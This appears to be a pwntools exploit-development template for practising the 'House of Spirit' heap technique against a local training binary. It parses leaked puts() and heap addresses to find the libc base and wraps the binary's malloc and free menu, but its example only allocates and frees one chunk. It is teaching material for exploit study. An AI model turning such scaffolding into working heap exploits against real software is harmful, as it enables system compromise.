#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_spirit")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size, data & chunk name.
# Returns chunk index.
def malloc(size, data, name):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.sendafter("name: ", name)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send the index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Set the "age" field.
age = 0x6f
io.sendafter("age: ", f"{age}")

# Set the "username" field.
username = "George"
io.sendafter("username: ", username)
io.recvuntil("> ")

# Request a 0x20-sized chunk.
# Fill it with data and name it.
name = b"A"*8
chunk_A = malloc(0x18, b"Y"*0x18, name)

# Free the chunk.
free(chunk_A)

# =============================================================================

io.interactive()
